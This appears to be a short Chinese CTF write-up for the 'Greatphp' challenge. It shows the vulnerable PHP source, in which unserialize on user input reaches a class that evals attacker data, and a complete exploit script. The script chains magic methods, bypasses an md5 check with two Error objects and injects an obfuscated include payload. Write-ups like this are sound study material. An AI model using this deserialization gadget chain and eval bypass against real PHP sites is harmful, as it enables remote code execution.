
## 反序列化 unserilaizer
题目    :[极客大挑战 2020]Greatphp
new Error类绕过md5.


```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class Backdoor {
    public $x;
    public $y;

    public function __invoke(){
        if( ($this->x != $this->y) && (md5($this->x) === md5($this->y)) ){
           if(!preg_match("/\<\?php/", $this->x, $match)){
               eval($this->x);
           } else {
               die("No Way!");
           }
           
        } else {
            die("Keep it up......");
        }
    }
}


class Entrance{
    public $name;
    public $str;
    public function __construct(){
        $this->name = "Bunny";
    }
    public function __toString(){
        return $this->str->name;
    }

    public function __wakeup(){
        echo 'Welcome, '.$this->name."<br>";
    }
}


class Test{
    public $z;
    public function __construct(){
        $this->z = array();
    }

    public function __get($key){
        $function = $this->z;
        return $function();
    }
}

if (isset($_GET['poc'])){
    unserialize($_GET['poc']);
}

?>
```

exp

```php
<?php


class Backdoor
{
    public $x;
    public $y;
}

class Test
{
    public $z;
}

class Entrance
{
    public $name;
    public $str;

    public function __construct()
    {
        $this->name = "Bunny";
    }

}

$shell = "?><?=os.system('dir');?>";
$shell = "?><?=include~".urldecode("%99%93%9E%98%D1%8F%97%8F")."?>";



$c = new Error($shell,1);$d = new Error($shell,2);

$e = new Entrance();
$t = new Test();
$b = new Backdoor();
$b->x = $c;
$b->y = $d;
$t->z = $b;
$e->str = $t;
$e->name = $e;
echo urlencode(serialize($e));
```